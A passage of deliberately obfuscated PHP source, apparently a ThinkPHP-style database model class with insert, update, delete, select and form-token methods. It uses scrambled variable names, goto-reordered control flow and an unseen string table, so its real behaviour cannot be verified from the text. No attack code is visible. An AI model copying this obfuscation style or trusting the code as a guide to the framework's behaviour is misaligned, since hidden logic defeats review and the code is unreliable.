return call_user_func_array(array($this, $fˆŒç¾—†[252]), $F…… »Ğ©¡); } else { return call_user_func_array(array(parent, $a¤¬¸àÄ¹®), $F…… »Ğ©¡); } } protected function call() { goto fó¼‘”¢ª; fó¼‘”¢ª: $eİÜ×¡í =& $_SERVER[´Ù×Íå‘ÄõÛ]; $CíªÒÒ–¥ = func_get_args(); $B¤ˆÊ«†‘Å = array_shift($CíªÒÒ–¥); goto bÌÉÉÒÆÌº; fñáÔğ¸‡‹: $dŒ¹Å³ë·… = call_user_func_array(array($this, $B¤ˆÊ«†‘Å), $CíªÒÒ–¥); if (method_exists($this, $eİÜ×¡í[256])) { $F„ëæŒ¬´Ö = call_user_func_array(array($this, $eİÜ×¡í[257]), array($Fè¨í±‹Ñ, $CíªÒÒ–¥, $dŒ¹Å³ë·…)); if ($F„ëæŒ¬´Ö) { return $F„ëæŒ¬´Ö; } } return $dŒ¹Å³ë·…; goto eéˆº¨•„å; bÌÉÉÒÆÌº: $Fè¨í±‹Ñ = $B¤ˆÊ«†‘Å; if (is_array($B¤ˆÊ«†‘Å)) { $Fè¨í±‹Ñ = $B¤ˆÊ«†‘Å[1]; $B¤ˆÊ«†‘Å = $B¤ˆÊ«†‘Å[0]; } $fç¸©‘›Ğ = count($CíªÒÒ–¥) - 1; goto CôÎĞ’; CôÎĞ’: if (isset($CíªÒÒ–¥[$fç¸©‘›Ğ]) && $CíªÒÒ–¥[$fç¸©‘›Ğ] === $B¤ˆÊ«†‘Å) { think_exception(__CLASS__ . $eİÜ×¡í[4] . $B¤ˆÊ«†‘Å . think_lang($eİÜ×¡í[253])); return; } $CíªÒÒ–¥[] = $B¤ˆÊ«†‘Å; if (method_exists($this, $eİÜ×¡í[254])) { $F„ëæŒ¬´Ö = call_user_func_array(array($this, $eİÜ×¡í[255]), array($Fè¨í±‹Ñ, $CíªÒÒ–¥)); if (!is_null($F„ëæŒ¬´Ö) && $F„ëæŒ¬´Ö !== !1) { return $F„ëæŒ¬´Ö; } } goto fñáÔğ¸‡‹; eéˆº¨•„å: } protected function _initialize() { } protected function _facade($A°‰ôÃóã¨) { $cš÷È»èƒ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!empty($this->fields)) { foreach ($A°‰ôÃóã¨ as $bÛæÌ‚±Å => $a¢§¤‰ì²ß) { if (!in_array($bÛæÌ‚±Å, $this->fields, !0)) { unset($A°‰ôÃóã¨[$bÛæÌ‚±Å]); } elseif (is_scalar($a¢§¤‰ì²ß)) { $this->_parseType($A°‰ôÃóã¨, $bÛæÌ‚±Å); } } } if (!empty($this->options[$cš÷È»èƒ[258]])) { $A°‰ôÃóã¨ = array_map($this->options[$cš÷È»èƒ[258]], $A°‰ôÃóã¨); unset($this->options[$cš÷È»èƒ[258]]); } $this->_beforeWrite($A°‰ôÃóã¨); return $A°‰ôÃóã¨; } protected function _beforeWrite(&$f£¡³÷¤Ğ ) { } public function add($FåêÁ¶ƒ«È = '', $C˜ªĞÕÄ¤¡ = array(), $A®µŒ…ï“» = false) { goto DÏÃõ˜Ó“º; eÁÂ¥´†êø: if (!1 === $this->_beforeInsert($FåêÁ¶ƒ«È, $C˜ªĞÕÄ¤¡)) { return !1; } $f¡¬¸À¼Éº = $this->db->insert($FåêÁ¶ƒ«È, $C˜ªĞÕÄ¤¡, $A®µŒ…ï“»); if (!1 !== $f¡¬¸À¼Éº) { $Få¹¶ÈšÁ = $this->getLastInsID(); if ($Få¹¶ÈšÁ) { $FåêÁ¶ƒ«È[$this->getPk()] = $Få¹¶ÈšÁ; $this->_after_insert($FåêÁ¶ƒ«È, $C˜ªĞÕÄ¤¡); return $Få¹¶ÈšÁ; } $this->_after_insert($FåêÁ¶ƒ«È, $C˜ªĞÕÄ¤¡); } goto d²Ì…õ°…œ; d²Ì…õ°…œ: return $f¡¬¸À¼Éº; goto f×ÁĞ‘›¾; DÏÃõ˜Ó“º: if (empty($FåêÁ¶ƒ«È)) { if (!empty($this->data)) { $FåêÁ¶ƒ«È = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[´Ù×Íå‘ÄõÛ][259]); return !1; } } $C˜ªĞÕÄ¤¡ = $this->_parseOptions($C˜ªĞÕÄ¤¡); $FåêÁ¶ƒ«È = $this->_facade($FåêÁ¶ƒ«È); goto eÁÂ¥´†êø; f×ÁĞ‘›¾: } protected function _beforeInsert(&$Cìº¯ ‰àŸ, $C·¨Óö¸ˆ×) { } protected function _after_insert($cŞŞ¡”°, $A÷ø‘öÛè‹) { } public function addAll($c‹šÂ·µÈ®, $A°ÆªÍ‚ = array(), $bµÌ¿²ÄÒ™ = false) { goto f°Œ»Ää÷…; d¤¸ÒíçÖÇ: foreach ($c‹šÂ·µÈ® as $Bï‹‚òÄœ’ => $có¨ãîÁ©) { $c‹šÂ·µÈ®[$Bï‹‚òÄœ’] = $this->_facade($có¨ãîÁ©); } if (method_exists($this->db, $F—¢øÇ‡ï[260])) { $aÁ ©Ú²¦ = $this->db->insertAll($c‹šÂ·µÈ®, $A°ÆªÍ‚, $bµÌ¿²ÄÒ™); } else { $this->startTrans(); foreach ($c‹šÂ·µÈ® as $Bï‹‚òÄœ’ => $có¨ãîÁ©) { $aÁ ©Ú²¦ = $this->db->insert($có¨ãîÁ©, $A°ÆªÍ‚, $bµÌ¿²ÄÒ™); } $this->commit(); } if (!1 !== $aÁ ©Ú²¦) { $aäïæ¼È¤î = $this->getLastInsID(); if ($aäïæ¼È¤î) { return $aäïæ¼È¤î; } } goto BÂôŠôê‡; f°Œ»Ää÷…: $F—¢øÇ‡ï =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (empty($c‹šÂ·µÈ®)) { $this->error = think_lang($F—¢øÇ‡ï[259]); return !1; } $A°ÆªÍ‚ = $this->_parseOptions($A°ÆªÍ‚); goto d¤¸ÒíçÖÇ; BÂôŠôê‡: return $aÁ ©Ú²¦; goto Bá¶ÊéäÕæ; Bá¶ÊéäÕæ: } public function selectAdd($f‰î¬÷Çâ = '', $böø§ñòÉ = '', $B—§ÈºÓè = array()) { $dŠŸœ­ÒÊ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $B—§ÈºÓè = $this->_parseOptions($B—§ÈºÓè); if (!1 === ($a—Ã±šœ‡» = $this->db->selectInsert($f‰î¬÷Çâ ? $f‰î¬÷Çâ : $B—§ÈºÓè[$dŠŸœ­ÒÊ[261]], $böø§ñòÉ ? $böø§ñòÉ : $this->getTableName(), $B—§ÈºÓè))) { $this->error = think_lang($dŠŸœ­ÒÊ[262]); return !1; } else { return $a—Ã±šœ‡»; } } public function save($a¸Şˆ‘Öôã = '', $e¬Ğ—ìÊ” = array()) { goto f İ¦ñ²èë; f‚¿‡Œ„Á®: if (is_array($e¬Ğ—ìÊ”[$cö•Êò„†[263]]) && isset($e¬Ğ—ìÊ”[$cö•Êò„†[263]][$AŠ‘”òÜ])) { $F‰±Ù¡ÑòÈ = $e¬Ğ—ìÊ”[$cö•Êò„†[263]][$AŠ‘”òÜ]; } if (!1 === $this->_beforeUpdate($a¸Şˆ‘Öôã, $e¬Ğ—ìÊ”)) { return !1; } $bŒ¬‚šÌ÷ = $this->db->update($a¸Şˆ‘Öôã, $e¬Ğ—ìÊ”); goto böÌÉ‹Œ˜Œ; f İ¦ñ²èë: $cö•Êò„† =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (empty($a¸Şˆ‘Öôã)) { if (!empty($this->data)) { $a¸Şˆ‘Öôã = $this->data; $this->data = array(); } else { $this->error = think_lang($cö•Êò„†[259]); return !1; } } $a¸Şˆ‘Öôã = $this->_facade($a¸Şˆ‘Öôã); goto AÆÅó¯›½; böÌÉ‹Œ˜Œ: if (!1 !== $bŒ¬‚šÌ÷) { if (isset($F‰±Ù¡ÑòÈ)) { $a¸Şˆ‘Öôã[$AŠ‘”òÜ] = $F‰±Ù¡ÑòÈ; } $this->_afterUpdate($a¸Şˆ‘Öôã, $e¬Ğ—ìÊ”); } return $bŒ¬‚šÌ÷; goto e˜ÛËğøòõ; AÆÅó¯›½: $e¬Ğ—ìÊ” = $this->_parseOptions($e¬Ğ—ìÊ”); $AŠ‘”òÜ = $this->getPk(); if (!isset($e¬Ğ—ìÊ”[$cö•Êò„†[263]])) { if (isset($a¸Şˆ‘Öôã[$AŠ‘”òÜ])) { $BŠĞËİ˜“[$AŠ‘”òÜ] = $a¸Şˆ‘Öôã[$AŠ‘”òÜ]; $e¬Ğ—ìÊ”[$cö•Êò„†[263]] = $BŠĞËİ˜“; unset($a¸Şˆ‘Öôã[$AŠ‘”òÜ]); } else { $this->error = think_lang($cö•Êò„†[262]); return !1; } } goto f‚¿‡Œ„Á®; e˜ÛËğøòõ: } protected function _beforeUpdate(&$F÷ô’àåÙ‡, $A†³ÊÂã) { } protected function _afterUpdate($aøÊ„·İ½›, $E¾Šãµ–µ¾) { } public function delete($dæ÷ª ¤ˆŸ = array()) { goto AŸŠäé; AŸŠäé: $eîÎŒ®ø¯ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (empty($dæ÷ª ¤ˆŸ) && empty($this->options[$eîÎŒ®ø¯[263]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $f—øØØé‹ = $this->getPk(); goto BêÛ¯§ö†; BêÛ¯§ö†: if (is_numeric($dæ÷ª ¤ˆŸ) || is_string($dæ÷ª ¤ˆŸ)) { if (strpos($dæ÷ª ¤ˆŸ, $eîÎŒ®ø¯[47])) { $Aâ¼ù¤¥[$f—øØØé‹] = array($eîÎŒ®ø¯[264], $dæ÷ª ¤ˆŸ); } else { $Aâ¼ù¤¥[$f—øØØé‹] = $dæ÷ª ¤ˆŸ; } $this->options[$eîÎŒ®ø¯[263]] = $Aâ¼ù¤¥; } $dæ÷ª ¤ˆŸ = $this->_parseOptions(); if (is_array($dæ÷ª ¤ˆŸ[$eîÎŒ®ø¯[263]]) && isset($dæ÷ª ¤ˆŸ[$eîÎŒ®ø¯[263]][$f—øØØé‹])) { $C†•Ññæõ = $dæ÷ª ¤ˆŸ[$eîÎŒ®ø¯[263]][$f—øØØé‹]; } goto cƒšÃƒÓ§È; cƒšÃƒÓ§È: $c†êŞƒ¢çß = $this->db->delete($dæ÷ª ¤ˆŸ); if (!1 !== $c†êŞƒ¢çß) { $cÓğÛ»¾ìÊ = array(); if (isset($C†•Ññæõ)) { $cÓğÛ»¾ìÊ[$f—øØØé‹] = $C†•Ññæõ; } $this->_after_delete($cÓğÛ»¾ìÊ, $dæ÷ª ¤ˆŸ); } return $c†êŞƒ¢çß; goto aŒ¸²Æ³¨®; aŒ¸²Æ³¨®: } protected function _after_delete($bªÃïÏ‹´, $F¯éíÅÍÖ) { } public function select($Fš‘‚¸Œ = array()) { goto D§‹´¨¯Œá; D§‹´¨¯Œá: $F…™Æé›ô„ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (is_string($Fš‘‚¸Œ) || is_numeric($Fš‘‚¸Œ)) { $e÷©Á¡ö× = $this->getPk(); if (strpos($Fš‘‚¸Œ, $F…™Æé›ô„[47])) { $cå¢¨àƒ•–[$e÷©Á¡ö×] = array($F…™Æé›ô„[264], $Fš‘‚¸Œ); } else { $cå¢¨àƒ•–[$e÷©Á¡ö×] = $Fš‘‚¸Œ; } $this->options[$F…™Æé›ô„[263]] = $cå¢¨àƒ•–; } elseif (!1 === $Fš‘‚¸Œ) { $Fš‘‚¸Œ = $this->_parseOptions(); return $F…™Æé›ô„[265] . $this->db->buildSelectSql($Fš‘‚¸Œ) . $F…™Æé›ô„[266]; } $Fš‘‚¸Œ = $this->_parseOptions(); goto b¯«££°à÷; fÕô÷Ä²¨Ø: $this->_afterSelect($díÉ¥ßƒÉÉ, $Fš‘‚¸Œ); return $díÉ¥ßƒÉÉ; goto bÀ’‰ŸÂÓå; b¯«££°à÷: $díÉ¥ßƒÉÉ = $this->db->select($Fš‘‚¸Œ); if (!1 === $díÉ¥ßƒÉÉ) { return !1; } if (empty($díÉ¥ßƒÉÉ)) { return null; } goto fÕô÷Ä²¨Ø; bÀ’‰ŸÂÓå: } protected function _afterSelect(&$bğÃî¬ƒ’¾, $F¯¥™ñä±½) { } public function buildSql($CÛç¹İ‡Õ¤ = array()) { $C³°™Ñ«Ú‡ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $CÛç¹İ‡Õ¤ = $this->_parseOptions($CÛç¹İ‡Õ¤); return $C³°™Ñ«Ú‡[265] . $this->db->buildSelectSql($CÛç¹İ‡Õ¤) . $C³°™Ñ«Ú‡[266]; } public function optionsValue($dë¥ Š­Í = null) { if (is_null($dë¥ Š­Í)) { return $this->options; } elseif (is_array($dë¥ Š­Í)) { $this->options = array_merge($this->options, $dë¥ Š­Í); } } protected function _parseOptions($aó·ï‡Ò‡ = array()) { goto FášÜŸà; FášÜŸà: $B¤íŞ‰ö›” =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (is_array($aó·ï‡Ò‡)) { $aó·ï‡Ò‡ = array_merge($this->options, $aó·ï‡Ò‡); } $this->options = array(); goto dç³ ¤º§‡; dç³ ¤º§‡: if (!isset($aó·ï‡Ò‡[$B¤íŞ‰ö›”[267]])) { $aó·ï‡Ò‡[$B¤íŞ‰ö›”[267]] = $this->getTableName(); $AˆğÍİ¤†‘ = $this->fields; } else { $AˆğÍİ¤†‘ = $this->getDbFields(); } if (!empty($aó·ï‡Ò‡[$B¤íŞ‰ö›”[268]])) { $aó·ï‡Ò‡[$B¤íŞ‰ö›”[267]] .= $B¤íŞ‰ö›”[50] . $aó·ï‡Ò‡[$B¤íŞ‰ö›”[268]]; } $aó·ï‡Ò‡[$B¤íŞ‰ö›”[269]] = $this->name; goto F¶óœÃù¾è; F¶óœÃù¾è: if (isset($aó·ï‡Ò‡[$B¤íŞ‰ö›”[263]]) && is_array($aó·ï‡Ò‡[$B¤íŞ‰ö›”[263]]) && !empty($AˆğÍİ¤†‘) && !isset($aó·ï‡Ò‡[$B¤íŞ‰ö›”[270]]) && !isset($aó·ï‡Ò‡[$B¤íŞ‰ö›”[267]])) { foreach ($aó·ï‡Ò‡[$B¤íŞ‰ö›”[263]] as $eçƒÈª”ÅŠ => $bĞÀØ­Î) { $eçƒÈª”ÅŠ = trim($eçƒÈª”ÅŠ); if (in_array($eçƒÈª”ÅŠ, $AˆğÍİ¤†‘, !0)) { if (is_scalar($bĞÀØ­Î)) { $this->_parseType($aó·ï‡Ò‡[$B¤íŞ‰ö›”[263]], $eçƒÈª”ÅŠ); } } elseif (!is_numeric($eçƒÈª”ÅŠ) && $B¤íŞ‰ö›”[70] != substr($eçƒÈª”ÅŠ, 0, 1) && !1 === strpos($eçƒÈª”ÅŠ, $B¤íŞ‰ö›”[91]) && !1 === strpos($eçƒÈª”ÅŠ, $B¤íŞ‰ö›”[248]) && !1 === strpos($eçƒÈª”ÅŠ, $B¤íŞ‰ö›”[271]) && !1 === strpos($eçƒÈª”ÅŠ, $B¤íŞ‰ö›”[272])) { unset($aó·ï‡Ò‡[$B¤íŞ‰ö›”[263]][$eçƒÈª”ÅŠ]); } } } $this->_options_filter($aó·ï‡Ò‡); return $aó·ï‡Ò‡; goto B‰ê¬ÇèåÊ; B‰ê¬ÇèåÊ: } protected function _options_filter(&$f„…·‚¡‰ç) { } protected function _parseType(&$f¬µ…‚²É×, $c‰ƒªª„±) { $a–Ò¾âˆéè =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (empty($this->options[$a–Ò¾âˆéè[273]][$a–Ò¾âˆéè[4] . $c‰ƒªª„±])) { $c­°±õÔâ‚ = strtolower($this->fields[$a–Ò¾âˆéè[240]][$c‰ƒªª„±]); if (!1 !== strpos($c­°±õÔâ‚, $a–Ò¾âˆéè[274])) { } elseif (!1 === strpos($c­°±õÔâ‚, $a–Ò¾âˆéè[275]) && !1 !== strpos($c­°±õÔâ‚, $a–Ò¾âˆéè[276])) { $f¬µ…‚²É×[$c‰ƒªª„±] = intval($f¬µ…‚²É×[$c‰ƒªª„±]); } elseif (!1 !== strpos($c­°±õÔâ‚, $a–Ò¾âˆéè[277]) || !1 !== strpos($c­°±õÔâ‚, $a–Ò¾âˆéè[278])) { $f¬µ…‚²É×[$c‰ƒªª„±] = floatval($f¬µ…‚²É×[$c‰ƒªª„±]); } elseif (!1 !== strpos($c­°±õÔâ‚, $a–Ò¾âˆéè[279])) { $f¬µ…‚²É×[$c‰ƒªª„±] = (bool) $f¬µ…‚²É×[$c‰ƒªª„±]; } } } public function find($e®®ÛÆÚÆ¸ = array()) { goto fìéã‹øœ; fìéã‹øœ: $dáÃÁ±ÌƒĞ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (is_numeric($e®®ÛÆÚÆ¸) || is_string($e®®ÛÆÚÆ¸)) { $b·³Í×³Ï„[$this->getPk()] = intval($e®®ÛÆÚÆ¸); $this->options[$dáÃÁ±ÌƒĞ[263]] = $b·³Í×³Ï„; } $this->options[$dáÃÁ±ÌƒĞ[280]] = 1; goto B·ìÄµ´¹†; cŠ½ã•§µ: if (empty($D•ÔÔ¬Ó‘)) { return null; } $this->data = $D•ÔÔ¬Ó‘[0]; $this->_afterFind($this->data, $e®®ÛÆÚÆ¸); goto BÅ·ÍæÃ×Í; BÅ·ÍæÃ×Í: if (!empty($this->options[$dáÃÁ±ÌƒĞ[281]])) { return $this->returnResult($this->data, $this->options[$dáÃÁ±ÌƒĞ[281]]); } return $this->data; goto aÑ±ãÅ; B·ìÄµ´¹†: $e®®ÛÆÚÆ¸ = $this->_parseOptions(); $D•ÔÔ¬Ó‘ = $this->db->select($e®®ÛÆÚÆ¸); if (!1 === $D•ÔÔ¬Ó‘) { return !1; } goto cŠ½ã•§µ; aÑ±ãÅ: } protected function _afterFind(&$b”è²ÒØ¹, $fÓ´ÔóÒõ) { } protected function returnResult($F­ë©‹¸Ô¬, $EªµŒ——Şƒ = '') { $b“Œ°®¿‹å =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($EªµŒ——Şƒ) { if (is_callable($EªµŒ——Şƒ)) { return call_user_func($EªµŒ——Şƒ, $F­ë©‹¸Ô¬); } switch (strtolower($EªµŒ——Şƒ)) { case $b“Œ°®¿‹å[282]: return json_encode($F­ë©‹¸Ô¬); case $b“Œ°®¿‹å[283]: return xml_encode($F­ë©‹¸Ô¬); } } return $F­ë©‹¸Ô¬; } public function parseFieldsMap($eïÇ‰¶½åŒ, $fÁ™ĞÄ‡Œˆ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $c‡¬ŒÄáöÈ => $FƒÏ…öÔ½Ï) { if ($fÁ™ĞÄ‡Œˆ == 1) { if (isset($eïÇ‰¶½åŒ[$FƒÏ…öÔ½Ï])) { $eïÇ‰¶½åŒ[$c‡¬ŒÄáöÈ] = $eïÇ‰¶½åŒ[$FƒÏ…öÔ½Ï]; unset($eïÇ‰¶½åŒ[$FƒÏ…öÔ½Ï]); } } else { if (isset($eïÇ‰¶½åŒ[$c‡¬ŒÄáöÈ])) { $eïÇ‰¶½åŒ[$FƒÏ…öÔ½Ï] = $eïÇ‰¶½åŒ[$c‡¬ŒÄáöÈ]; unset($eïÇ‰¶½åŒ[$c‡¬ŒÄáöÈ]); } } } } return $eïÇ‰¶½åŒ; } public function setField($aš˜¢•ïË, $DñÜÆò‘ƒƒ = '') { if (is_array($aš˜¢•ïË)) { $cº«Ö›­Í· = $aš˜¢•ïË; } else { $cº«Ö›­Í·[$aš˜¢•ïË] = $DñÜÆò‘ƒƒ; } return $this->save($cº«Ö›­Í·); } public function setAdd($a„ÄéšŒ˜, $b¼º„²˜øÈ = 1) { $B®á†ì¦ˆ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $d±óáó…ß› = $a„ÄéšŒ˜ . $B®á†ì¦ˆ[284] . $b¼º„²˜øÈ; if ($b¼º„²˜øÈ < 0) { $d±óáó…ß› = $a„ÄéšŒ˜ . $b¼º„²˜øÈ; } return $this->setField($a„ÄéšŒ˜, array($B®á†ì¦ˆ[285], $d±óáó…ß›)); } public function getField($BÇª¯¼Ëå, $aÑÕØĞŠ’Á = null) { $E†’‘†Á²’ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $D‰à³Ûß¥[$E†’‘†Á²’[261]] = $BÇª¯¼Ëå; $D‰à³Ûß¥ = $this->_parseOptions($D‰à³Ûß¥); $BÇª¯¼Ëå = trim($BÇª¯¼Ëå); if (strpos($BÇª¯¼Ëå, $E†’‘†Á²’[47])) { if (!isset($D‰à³Ûß¥[$E†’‘†Á²’[280]])) { $D‰à³Ûß¥[$E†’‘†Á²’[280]] = is_numeric($aÑÕØĞŠ’Á) ? $aÑÕØĞŠ’Á : $E†’‘†Á²’[33]; } $d—ÚŞìÚ‡ = $this->db->select($D‰à³Ûß¥); if (!empty($d—ÚŞìÚ‡)) { goto B‘«Ñí¨×; B‘«Ñí¨×: $E‹ñ¦Ø²ğÚ = explode($E†’‘†Á²’[47], $BÇª¯¼Ëå); $BÇª¯¼Ëå = array_keys($d—ÚŞìÚ‡[0]); $d“Ø¡ËĞŞ¾ = array_shift($BÇª¯¼Ëå); goto F–²Î½è‚; F–²Î½è‚: $DìéØˆÜ³š = array_shift($BÇª¯¼Ëå); $fò‰—¤ÇÓÄ = array(); $a¸ëøØåƒŒ = count($E‹ñ¦Ø²ğÚ); goto c¦ËæäĞÜ»; c¦ËæäĞÜ»: foreach ($d—ÚŞìÚ‡ as $c‘“šÇÔß) { $cäŸ´îÂ = $c‘“šÇÔß[$d“Ø¡ËĞŞ¾]; if (2 == $a¸ëøØåƒŒ) { $fò‰—¤ÇÓÄ[$cäŸ´îÂ] = $c‘“šÇÔß[$DìéØˆÜ³š]; } else { $fò‰—¤ÇÓÄ[$cäŸ´îÂ] = is_string($aÑÕØĞŠ’Á) ? implode($aÑÕØĞŠ’Á, $c‘“šÇÔß) : $c‘“šÇÔß; } } return $fò‰—¤ÇÓÄ; goto Bóá¾ ¦ïÙ; Bóá¾ ¦ïÙ: } } else { if (!0 !== $aÑÕØĞŠ’Á) { $D‰à³Ûß¥[$E†’‘†Á²’[280]] = is_numeric($aÑÕØĞŠ’Á) ? $aÑÕØĞŠ’Á : 1; } if ($aÑÕØĞŠ’Á === $E†’‘†Á²’[243]) { unset($D‰à³Ûß¥[$E†’‘†Á²’[280]]); } $c‘“šÇÔß = $this->db->select($D‰à³Ûß¥); if (!empty($c‘“šÇÔß)) { if ($aÑÕØĞŠ’Á === $E†’‘†Á²’[243]) { return reset($c‘“šÇÔß[0]); } if (!0 !== $aÑÕØĞŠ’Á && 1 == $D‰à³Ûß¥[$E†’‘†Á²’[280]]) { return reset($c‘“šÇÔß[0]); } foreach ($c‘“šÇÔß as $e²È»ÌÜ) { $fÑÊ™¢š›[] = $e²È»ÌÜ[$BÇª¯¼Ëå]; } return $fÑÊ™¢š›; } } return null; } public function create($bšëÊ¼ã¼ª = '', $Dô½ù¨ÒšÌ = '') { goto D‚¹ÃÃ¢Öã; CÁ”»ËËÀí: if (isset($F¡ª·éÆò)) { if (is_string($F¡ª·éÆò)) { $F¡ª·éÆò = explode($AƒˆìêàÂ’[47], $F¡ª·éÆò); } if (think_config($AƒˆìêàÂ’[286])) { $F¡ª·éÆò[] = think_config($AƒˆìêàÂ’[287]); } foreach ($bšëÊ¼ã¼ª as $Aà‘÷¯ˆ’Ó => $d†Şêš…) { if (!in_array($Aà‘÷¯ˆ’Ó, $F¡ª·éÆò)) { unset($bšëÊ¼ã¼ª[$Aà‘÷¯ˆ’Ó]); } } } if (!$this->autoValidation($bšëÊ¼ã¼ª, $Dô½ù¨ÒšÌ)) { return !1; } if (!$this->autoCheckToken($bšëÊ¼ã¼ª)) { $this->error = think_lang($AƒˆìêàÂ’[288]); return !1; } goto e…¾Ìâ–º; e…¾Ìâ–º: if ($this->autoCheckFields) { $F¡ª·éÆò = $this->getDbFields(); foreach ($bšëÊ¼ã¼ª as $Aà‘÷¯ˆ’Ó => $d†Şêš…) { if (!in_array($Aà‘÷¯ˆ’Ó, $F¡ª·éÆò)) { unset($bšëÊ¼ã¼ª[$Aà‘÷¯ˆ’Ó]); } elseif (MAGIC_QUOTES_GPC && is_string($d†Şêš…)) { $bšëÊ¼ã¼ª[$Aà‘÷¯ˆ’Ó] = stripslashes($d†Şêš…); } } } $this->autoOperation($bšëÊ¼ã¼ª, $Dô½ù¨ÒšÌ); $this->data = $bšëÊ¼ã¼ª; goto eÖ¡ÈÍÆ¨‘; D‚¹ÃÃ¢Öã: $AƒˆìêàÂ’ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (empty($bšëÊ¼ã¼ª)) { $bšëÊ¼ã¼ª = $_POST; } elseif (is_object($bšëÊ¼ã¼ª)) { $bšëÊ¼ã¼ª = get_object_vars($bšëÊ¼ã¼ª); } if (empty($bšëÊ¼ã¼ª) || !is_array($bšëÊ¼ã¼ª)) { $this->error = think_lang($AƒˆìêàÂ’[259]); return !1; } goto fåîã‰÷•õ; fåîã‰÷•õ: $bšëÊ¼ã¼ª = $this->parseFieldsMap($bšëÊ¼ã¼ª, 0); $Dô½ù¨ÒšÌ = $Dô½ù¨ÒšÌ ? $Dô½ù¨ÒšÌ : (!empty($bšëÊ¼ã¼ª[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$AƒˆìêàÂ’[261]])) { $F¡ª·éÆò = $this->options[$AƒˆìêàÂ’[261]]; unset($this->options[$AƒˆìêàÂ’[261]]); } elseif ($Dô½ù¨ÒšÌ == THINK_MODEL_INSERT && isset($this->insertFields)) { $F¡ª·éÆò = $this->insertFields; } elseif ($Dô½ù¨ÒšÌ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $F¡ª·éÆò = $this->updateFields; } goto CÁ”»ËËÀí; eÖ¡ÈÍÆ¨‘: return $bšëÊ¼ã¼ª; goto fÄçÆâè˜; fÄçÆâè˜: } public function autoCheckToken($Fˆƒ²´¶Âæ) { $e¸™Ÿæ–Û‰ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (isset($this->options[$e¸™Ÿæ–Û‰[289]]) && !$this->options[$e¸™Ÿæ–Û‰[289]]) { return !0; } if (think_config($e¸™Ÿæ–Û‰[286])) { $D¥½òç½‘í = think_config($e¸™Ÿæ–Û‰[287]); if (!isset($Fˆƒ²´¶Âæ[$D¥½òç½‘í]) || Session::get($D¥½òç½‘í)) { return !1; } list($dÈÊ¢¶ö‘ë, $c­ò™ñ¦ƒô) = explode($e¸™Ÿæ–Û‰[70], $Fˆƒ²´¶Âæ[$D¥½òç½‘í]); if ($c­ò™ñ¦ƒô && Session::get($D¥½òç½‘í . $e¸™Ÿæ–Û‰[91] . $dÈÊ¢¶ö‘ë) === $c­ò™ñ¦ƒô) { Session::remove($D¥½òç½‘í . $e¸™Ÿæ–Û‰[91] . $dÈÊ¢¶ö‘ë); return !0; } if (think_config($e¸™Ÿæ–Û‰[290])) { Session::remove($D¥½òç½‘í . $e¸™Ÿæ–Û‰[91] . $dÈÊ¢¶ö‘ë); } return !1; } return !0; } public function regex($CÒ½“ëœ¤, $Fêé‡ÆÛ®Š) { $C¥¨ÆÌöíŠ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $CìèŸ‡ğ¨ = array($C¥¨ÆÌöíŠ[291] => $C¥¨ÆÌöíŠ[292], $C¥¨ÆÌöíŠ[293] => $C¥¨ÆÌöíŠ[294], $C¥¨ÆÌöíŠ[295] => $C¥¨ÆÌöíŠ[296], $C¥¨ÆÌöíŠ[297] => $C¥¨ÆÌöíŠ[298], $C¥¨ÆÌöíŠ[299] => $C¥¨ÆÌöíŠ[300], $C¥¨ÆÌöíŠ[301] => $C¥¨ÆÌöíŠ[302], $C¥¨ÆÌöíŠ[303] => $C¥¨ÆÌöíŠ[304], $C¥¨ÆÌöíŠ[278] => $C¥¨ÆÌöíŠ[305], $C¥¨ÆÌöíŠ[306] => $C¥¨ÆÌöíŠ[307]); if (isset($CìèŸ‡ğ¨[strtolower($Fêé‡ÆÛ®Š)])) { $Fêé‡ÆÛ®Š = $CìèŸ‡ğ¨[strtolower($Fêé‡ÆÛ®Š)]; } return preg_match($Fêé‡ÆÛ®Š, $CÒ½“ëœ¤) === 1; } private function autoOperation(&$c£ç’Œ°„â, $FçğÛ‰Á³™) { $d‘´Õ›œóÆ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!empty($this->options[$d‘´Õ›œóÆ[308]])) { $FŠ®ôË© = $this->options[$d‘´Õ›œóÆ[308]]; unset($this->options[$d‘´Õ›œóÆ[308]]); } elseif (!empty($this->_auto)) { $FŠ®ôË© = $this->_auto; } if (isset($FŠ®ôË©)) { foreach ($FŠ®ôË© as $bÄµ¿ß­èø) { if (empty($bÄµ¿ß­èø[2])) { $bÄµ¿ß­èø[2] = THINK_MODEL_INSERT; } if ($FçğÛ‰Á³™ == $bÄµ¿ß­èø[2] || $bÄµ¿ß­èø[2] == THINK_MODEL_BOTH) { switch (trim($bÄµ¿ß­èø[3])) { case $d‘´Õ›œóÆ[309]: case $d‘´Õ›œóÆ[310]: $CêÑ®ÉèÇ = isset($bÄµ¿ß­èø[4]) ? (array) $bÄµ¿ß­èø[4] : array(); if (isset($c£ç’Œ°„â[$bÄµ¿ß­èø[0]])) { array_unshift($CêÑ®ÉèÇ, $c£ç’Œ°„â[$bÄµ¿ß­èø[0]]); } if ($d‘´Õ›œóÆ[309] == $bÄµ¿ß­èø[3]) { $c£ç’Œ°„â[$bÄµ¿ß­èø[0]] = call_user_func_array($bÄµ¿ß­èø[1], $CêÑ®ÉèÇ); } else { $c£ç’Œ°„â[$bÄµ¿ß­èø[0]] = call_user_func_array(array(&$this, $bÄµ¿ß­èø[1]), 